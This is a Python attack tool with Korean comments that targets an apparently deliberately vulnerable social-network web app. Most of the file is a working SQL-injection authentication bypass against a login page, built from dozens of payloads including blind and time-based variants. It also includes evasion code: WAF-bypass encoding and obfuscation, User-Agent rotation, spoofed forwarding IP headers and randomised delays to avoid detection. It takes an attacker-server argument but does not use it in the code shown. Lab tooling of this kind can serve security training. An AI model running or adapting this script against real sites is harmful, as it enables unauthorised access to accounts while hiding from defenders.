import requests
from bs4 import BeautifulSoup
from urllib.parse import quote, unquote
import time
import json
import re
from datetime import datetime
import random
import base64
import string

class AdvancedVulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server, stealth_mode=True, report_dir="security_reports"):
        self.base_url = base_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()
        self.stealth_mode = stealth_mode
        self.report_dir = report_dir
        
        # User-Agent 로테이션을 위한 리스트
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
        self.set_random_user_agent()
        self.add_legitimate_headers()
        
        self.vulnerabilities = {
            'sql_injection': [],
            'xss': [],
            'csrf': [],
            'lfi': [],
            'file_upload': []
        }
        self.logged_in = False
        self.current_points = 0
        self.attacker_user_id = None
        self.uploaded_webshell = None
        self.start_time = datetime.now()
        self.attack_timeline = []
        
        # WAF 우회를 위한 인코딩 방식
        self.encoding_methods = ['url', 'double_url', 'hex', 'unicode', 'mixed']
    
    def set_random_user_agent(self):
        """랜덤 User-Agent 설정"""
        self.session.headers['User-Agent'] = random.choice(self.user_agents)
    
    def add_legitimate_headers(self):
        """정상적인 브라우저처럼 보이게 하는 헤더 추가"""
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })
    
    def generate_random_ip(self):
        """랜덤 IP 생성"""
        return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    def add_delay(self, min_delay=0.5, max_delay=3.0):
        """탐지 회피를 위한 랜덤 딜레이"""
        if self.stealth_mode:
            delay = random.uniform(min_delay, max_delay)
            time.sleep(delay)
    
    def encode_payload(self, payload, method='url'):
        """다양한 인코딩으로 WAF 우회"""
        if method == 'url':
            return quote(payload, safe='')
        elif method == 'double_url':
            return quote(quote(payload, safe=''), safe='')
        elif method == 'hex':
            return ''.join([f'%{ord(c):02x}' for c in payload])
        elif method == 'unicode':
            # Unicode 변환
            replacements = {
                "'": "\\u0027",
                '"': "\\u0022",
                '<': "\\u003c",
                '>': "\\u003e",
                '/': "\\u002f",
                ' ': "\\u0020"
            }
            for char, unicode_char in replacements.items():
                payload = payload.replace(char, unicode_char)
            return payload
        elif method == 'mixed':
            # 대소문자 혼용
            return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        return payload
    
    def obfuscate_sql(self, payload):
        """SQL 페이로드 난독화"""
        obfuscations = {
            ' ': random.choice(['/**/','%20','+','\t']),
            'OR': random.choice(['Or','oR','OR','or']),
            'AND': random.choice(['And','aNd','AND','and']),
            'SELECT': random.choice(['Select','SeLeCt','SELECT','select']),
            'UNION': random.choice(['Union','UnIoN','UNION','union']),
            '=': random.choice(['=','LIKE'])
        }
        
        for original, obfuscated in obfuscations.items():
            payload = payload.replace(original, obfuscated)
        
        return payload
    
    def log_event(self, event_type, description, severity="INFO", details=None):
        """공격 타임라인 로깅"""
        event = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'type': event_type,
            'description': description,
            'severity': severity,
            'details': details or {}
        }
        self.attack_timeline.append(event)
    
    def print_section(self, title):
        print("\n" + "="*60)
        print(f"{title}")
        print("="*60)
    
    def get_attacker_user_id(self):
        """공격자의 user_id 확인"""
        try:
            response = self.session.get(f"{self.base_url}/profile.php")
            soup = BeautifulSoup(response.text, 'html.parser')
            
            user_id_input = soup.find('input', {'name': 'user_id'})
            if user_id_input:
                self.attacker_user_id = user_id_input.get('value')
                print(f"[*] Attacker User ID: {self.attacker_user_id}")
                return self.attacker_user_id
            
            profile_link = soup.find('a', href=re.compile(r'profile\.php\?user='))
            if profile_link:
                match = re.search(r'user=(\d+)', profile_link['href'])
                if match:
                    self.attacker_user_id = match.group(1)
                    print(f"[*] Attacker User ID: {self.attacker_user_id}")
                    return self.attacker_user_id
            
            if 'user_id' in self.session.cookies:
                self.attacker_user_id = self.session.cookies['user_id']
                print(f"[*] Attacker User ID from cookie: {self.attacker_user_id}")
                return self.attacker_user_id
            
            response = self.session.get(f"{self.base_url}/index.php")
            match = re.search(r'user_id\s*=\s*(\d+)', response.text)
            if match:
                self.attacker_user_id = match.group(1)
                print(f"[*] Attacker User ID from page: {self.attacker_user_id}")
                return self.attacker_user_id
                    
        except Exception as e:
            print(f"[-] Error getting user ID: {e}")
        
        self.attacker_user_id = "1"
        print(f"[*] Using default User ID: {self.attacker_user_id}")
        return self.attacker_user_id
    
    def test_sql_injection_advanced(self):
        """고급 SQL Injection - WAF 우회 기법 포함"""
        self.print_section("Advanced SQL Injection - WAF Bypass")
        
        login_url = f"{self.base_url}/login.php"
        
        print("[*] Testing Advanced SQL Injection payloads with WAF bypass...")
        
        # 기본 페이로드
        basic_payloads = [
            ("admin", '" or "1"="1" --', 'Double quote OR bypass'),
            ("admin", '" or 1=1 --', 'Double quote numeric OR'),
            ('admin" or "a"="a" --', 'anything', 'Username field injection'),
            ('admin" --', 'anything', 'Comment out password'),
            ("admin", "' or '1'='1", 'Password field injection')
        ]
        
        # 고급 WAF 우회 페이로드
        advanced_payloads = [
            # 대소문자 혼용
            ("admin", '" Or 1=1 --', 'Case variation'),
            ("admin", '" oR "1"="1" --', 'Mixed case'),
            
            # 주석 변형
            ("admin", '" or 1=1 #', 'Hash comment'),
            ("admin", '" or 1=1 /*comment*/', 'Inline comment'),
            ("admin", '" or 1=1 -- -', 'Double dash space'),
            
            # 공백 대체
            ("admin", '"/**/or/**/1=1/**/--', 'Comment as space'),
            ("admin", '"\tor\t1=1\t--', 'Tab as space'),
            ("admin", '"%20or%201=1%20--', 'URL encoded space'),
            
            # 인코딩
            ("admin", '" %6F%72 1=1 --', 'Partial hex encoding'),
            ("admin", '" \u006F\u0072 1=1 --', 'Unicode encoding'),
            
            # Time-based blind
            ("admin", '" or sleep(5) --', 'Time-based blind'),
            ("admin", '" or if(1=1,sleep(3),0) --', 'Conditional sleep'),
            
            # Boolean-based blind
            ("admin", '" or substring(version(),1,1)="5" --', 'Boolean blind'),
            ("admin", '" or ascii(substring(database(),1,1))>64 --', 'ASCII based blind'),
            
            # 특수 기법
            ("admin", '" /*!50000or*/ 1=1 --', 'MySQL version comment'),
            ("admin", '" or 1=1;#', 'Semicolon termination'),
            ("admin", '" or "1"like"1" --', 'LIKE operator'),
            ("admin", '" or 1 in (1) --', 'IN operator'),
            ("admin", '" or 1=1 order by 1 --', 'ORDER BY injection')
        ]
        
        # 모든 페이로드 통합
        all_payloads = basic_payloads + advanced_payloads
        
        success_count = 0
        
        for username, password, desc in all_payloads:
            try:
                # 탐지 회피를 위한 랜덤 딜레이
                self.add_delay()
                
                # User-Agent 로테이션
                if random.random() > 0.7:  # 30% 확률로 UA 변경
                    self.set_random_user_agent()
                
                # X-Forwarded-For 헤더 추가 (프록시 우회)
                self.session.headers['X-Forwarded-For'] = self.generate_random_ip()
                self.session.headers['X-Real-IP'] = self.generate_random_ip()
                
                print(f"\n[*] Trying: {desc}")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                
                # 추가 난독화 적용
                if random.random() > 0.5:
                    password = self.obfuscate_sql(password)
                    print(f"    Obfuscated: {password}")
                
                data = {'username': username, 'password': password}
                response = self.session.post(login_url, data=data, allow_redirects=True, timeout=10)
                

                # 디버깅 출력 추가
                print(f"    Response URL: {response.url}")
                print(f"    Response status: {response.status_code}")

                # 로그인 성공 조건 수정
                if 'index.php' in response.url:
                    # 실제로 로그인되었는지 추가 확인
                    if 'login.php' not in response.url:  # 로그인 페이지가 아닌지 확인
                        print(f"[+] SUCCESS! Logged in with advanced technique")
                        print(f"    Final URL: {response.url}")
                        
                        # 여기가 중요! 실제로 로그인되었는지 콘텐츠 확인
                        if '로그인' in response.text or 'Login' in response.text or 'login' in response.text.lower():
                            if '로그아웃' not in response.text and 'logout' not in response.text.lower():
                                print("[-] Warning: Still seeing login form, might be failed login")
                                continue
                    
                        soup = BeautifulSoup(response.text, 'html.parser')
                        points_text = soup.find(text=re.compile(r'\d+\s*P'))
                        if points_text:
                            points_match = re.search(r'(\d+)\s*P', points_text)
                            if points_match:
                                self.current_points = int(points_match.group(1))
                                print(f"    Current Points: {self.current_points}P")
                        
                        self.logged_in = True
                        self.get_attacker_user_id()
                        success_count += 1
                        
                        vuln_info = {
                            'url': login_url,
                            'username': username,
                            'password': password,
                            'description': desc,
                            'impact': 'CRITICAL - Authentication bypass with WAF evasion',
                            'cvss_score': 9.8,
                            'waf_bypass_technique': desc
                        }
                        self.vulnerabilities['sql_injection'].append(vuln_info)
                        
                        self.log_event(
                            'SQL_INJECTION_ADVANCED',
                            f'Successfully bypassed authentication using advanced SQL injection: {desc}',
                            'CRITICAL',
                            {
                                'payload': f"username={username}, password={password}",
                                'method': desc,
                                'account': 'admin',
                                'points': self.current_points,
                                'waf_bypass': True
                            }
                        )
                        
                        # 첫 번째 성공 후 계속 테스트할지 선택
                        if success_count >= 3:  # 3개 이상 성공하면 중단
                            print(f"\n[+] Multiple bypasses found. Stopping SQL injection tests.")
                            return True
                else:
                    print(f"[-] Failed - Still on: {response.url}")
                    
            except requests.exceptions.Timeout:
                print(f"[!] Timeout - possible time-based blind SQL injection!")
                if 'sleep' in password or 'benchmark' in password:
                    vuln_info = {
                        'url': login_url,
                        'username': username,
                        'password': password,
                        'description': f"{desc} - Time-based blind confirmed",
                        'impact': 'HIGH - Time-based blind SQL injection',
                        'cvss_score': 8.5,
                        'blind_type': 'time-based'
                    }
                    self.vulnerabilities['sql_injection'].append(vuln_info)
                    
            except Exception as e:
                print(f"[-] Error: {str(e)[:50]}")

        return self.logged_in
    
    def run_assessment(self):
        """전체 평가 실행"""
        print("\n" + "="*60)
        print("Advanced Vulnerable SNS - Security Assessment")
        print("="*60)
        print(f"Target: {self.base_url}")
        print(f"Attacker Server: {self.attacker_server}")
        print(f"Stealth Mode: {'ON' if self.stealth_mode else 'OFF'}")
        print("="*60)
        
        self.log_event('SCAN_START', f'Advanced security assessment started on {self.base_url}', 'INFO')
        
        # 1. Advanced SQL Injection
        print("\n[Phase 1: SQL Injection with WAF Bypass]")
        self.add_delay(2, 4)
        self.test_sql_injection_advanced()

        if not self.logged_in:
            print("\n[-] Login failed. Cannot continue.")
            self.log_event('SCAN_FAILED', 'Unable to gain access to the system', 'ERROR')
            return
        
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python3 advanced_attacker.py <target_url> <attacker_server> [--stealth]")
        print("Example: python3 advanced_attacker.py http://target.com/sns http://attacker.com:5000 --stealth")
        sys.exit(1)
    
    target = sys.argv[1]
    attacker_server = sys.argv[2]
    stealth_mode = '--stealth' in sys.argv
    
    attacker = AdvancedVulnerableSNSAttacker(target, attacker_server, stealth_mode)
    attacker.run_assessment()